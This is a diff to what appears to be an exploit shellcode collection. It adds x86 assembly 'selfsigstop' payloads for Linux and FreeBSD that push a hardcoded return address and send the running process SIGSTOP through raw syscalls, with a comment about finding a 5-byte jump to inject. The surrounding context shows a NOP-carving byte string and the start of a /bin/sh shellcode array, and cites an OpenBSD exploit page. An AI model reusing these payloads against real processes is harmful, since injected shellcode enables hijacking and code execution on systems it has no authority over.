@@ -25,6 +25,47 @@
 // moar at:
 // http://www.groar.org/expl/openbsd/english.shtml
 
+#if SELFSTOP
+
+#define RET 0x80494c0
+// 1) buscar jmp de 5 bytes
+#define INJECT jmp $delta-$here-10
+
+linux_selfsigstop:
+	push RET
+ 	/* 68 34 de 04 08 */
+        pusha
+        mov $20, %eax
+        int $0x80
+        mov %eax, %ebx /* pid */
+        mov $19, %ecx /* stop */
+        mov $37, %eax /* kill */
+        int $0x80
+        popa
+	ret
+
+
+freebsd_selfsigstop:
+	push RET_ADDR
+        pusha
+        mov $20, %eax
+        push %ebp
+        int $0x80
+        pop %ebp
+
+        push $17
+        push %eax
+        mov $37, %eax
+        push %ebp
+        int $0x80
+        pop %ebp
+        pop %ebp
+        pop %ebp
+        popa
+	ret
+
+#endif
+
 unsigned char nopcode_carver[] ="\x61\x66\x3D\x90\x90\x75\xF9\x54\xc3";
 
 unsigned char x86_linux_binsh[] =
